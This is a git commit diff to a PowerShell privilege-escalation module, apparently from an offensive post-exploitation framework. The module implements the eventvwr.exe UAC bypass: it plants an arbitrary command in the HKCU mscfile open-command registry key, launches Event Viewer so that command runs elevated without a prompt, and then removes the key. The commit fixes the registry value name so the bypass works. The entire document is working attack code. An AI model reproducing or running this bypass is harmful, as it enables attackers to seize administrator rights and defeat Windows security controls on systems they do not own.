53fa4f84faf011fdf06f8f524f64087295f3034a
cybervaca <cybervaca@gmail.com>
2017-04-05 13:27:29 +0200

    Update BypassUAC-HackPlayers-eventvwr.ps1

--- data/module_source/privesc/BypassUAC-HackPlayers-eventvwr.ps1
+++ data/module_source/privesc/BypassUAC-HackPlayers-eventvwr.ps1
@@ -2,7 +2,7 @@ function BypassUAC-HackPlayers-Eventvwr {
 param ([string]$comando)
 New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command -force | out-null
 $key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" 
-New-ItemProperty -Path $key -Value $comando -PropertyType string -Force
+New-ItemProperty -Path $key -name '(Default)' -Value $comando -PropertyType string -Force
 Start-Process eventvwr.exe -; sleep -Seconds 3
 Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile -Force | out-null
 }
